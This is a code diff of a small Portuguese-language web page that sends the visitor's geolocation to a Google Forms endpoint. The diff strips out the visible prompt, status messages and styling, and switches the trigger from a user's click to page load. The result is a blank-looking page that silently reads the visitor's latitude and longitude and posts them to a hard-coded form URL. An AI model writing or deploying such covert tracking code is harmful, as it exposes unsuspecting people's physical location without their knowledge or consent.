@@ -1,4 +1,3 @@
-<!DOCTYPE html>
 <html lang="pt-BR">
 <head>
   <meta charset="UTF-8">
@@ -7,32 +6,18 @@
     body {
       margin: 0;
       height: 100vh;
-      background-color: #f0f0f0;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      font-family: Arial, sans-serif;
-      cursor: pointer;
-    }
-    #status {
-      text-align: center;
-      font-size: 1.2em;
-      color: #333;
+      background-color: #ffffff;
     }
   </style>
 </head>
 <body>
-  <div id="status">Clique em qualquer lugar para enviar sua localização.</div>
-
   <script>
     const formURL = 'https://docs.google.com/forms/d/e/1FAIpQLSdpX76HCgkwL3ZqJCELRTJHTgFjbK1mNOx00Oy9dNqD2jyC1A/formResponse';
     const latitudeEntry = 'entry.138873872';
     const longitudeEntry = 'entry.1715135382';
 
-    document.body.addEventListener('click', () => {
-      const status = document.getElementById('status');
+    window.addEventListener('load', () => {
       if (navigator.geolocation) {
-        status.textContent = 'Obtendo localização...';
         navigator.geolocation.getCurrentPosition(position => {
           const lat = position.coords.latitude;
           const lon = position.coords.longitude;
@@ -46,13 +31,7 @@
             mode: 'no-cors',
             body: formData
           });
-
-          status.textContent = `Localização enviada: Latitude ${lat.toFixed(6)}, Longitude ${lon.toFixed(6)}`;
-        }, error => {
-          status.textContent = 'Não foi possível obter a localização.';
         });
-      } else {
-        status.textContent = 'Geolocalização não suportada pelo navegador.';
       }
     });
   </script>
